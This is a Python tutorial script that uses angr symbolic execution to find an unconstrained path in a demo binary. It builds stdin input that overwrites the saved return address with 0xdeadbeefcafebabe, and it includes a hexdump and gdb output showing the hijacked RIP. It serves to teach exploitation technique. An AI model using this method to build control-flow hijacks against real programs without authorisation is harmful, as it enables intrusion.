import angr
import claripy
import logging

"""
Verbose logging messages to watch the progress of the path_group
"""
logging.getLogger('angr.path_group').setLevel(logging.DEBUG)

"""
Load the demo3 binary into angr
"""
proj = angr.Project('demo3', load_options={'auto_load_libs': False})

"""
Start angr analysis at the entry point of the binary
"""
state = proj.factory.entry_state()

"""
By default, angr discards paths that are unconstrained. Since this is
exactly what we are aiming for in an exploitation example, we want to
save these paths for analysis.
"""
pg = proj.factory.path_group(state, save_unconstrained=True)

"""
Instead of the normal `.explore` function, we are going to single step
through each path with a unique function that will stop whenever we have found
one unconstrained path.
"""
pg.step(until=lambda x: len(x.unconstrained) > 0)

"""
Extract our path with an unconstrained execution (aka symbolic instruction pointer)
"""
state = pg.unconstrained[0].state

"""
Now that we have an unconstrained path, we can tell the solver that
we want to set RIP to 0xdeadbeefcafebabe. For this, we create a BitVector
(Z3 variable) to hold our 0xdeadbeefcafebabe
"""
crash_ip = claripy.BVV(int('deadbeefcafebabe', 16), 8 * 8)

"""
We then simply add the constraint to the symbolic solver such that our RIP
at the currently position in the path is 0xdeadbeefcafebabe
"""
state.se.add(state.regs.ip == crash_ip)

"""
We then solve the path with our newly added constriants
"""
payload = state.posix.dumps(0)

"""
Save our result to a file to test in gdb
"""
with open('solution', 'wb') as f:
    f.write(payload)

"""
0000000: 6261 6470 6173 7377 6f72 6400 0000 0000  badpassword.....
0000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000040: 0000 0000 0000 0000 beba feca efbe adde  ................
0000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
"""

"""
To verify:

Start our binary in gdb:

gdb ./demo3

Execute our solution with the demo:

r < solution

And see that our RIP will be overwritten at the next return with 0xdeadbeefcafebabe

  RSP  0x7fffffffdcf8 <-- 0xdeadbeefcafebabe

  RIP  0x4005ec (overflow_me+47) <-- ret
  [---CODE---]
   => 0x4005ec   <overflow_me+47>    ret
  [--STACK---]
   00:0000| rsp  0x7fffffffdcf8 <-- 0xdeadbeefcafebabe
   01:0008|      0x7fffffffdd00 <-- 0x0
   02:0010|      0x7fffffffdd08 <-- 0x0
   03:0018|      0x7fffffffdd10 <-- 0x0

"""
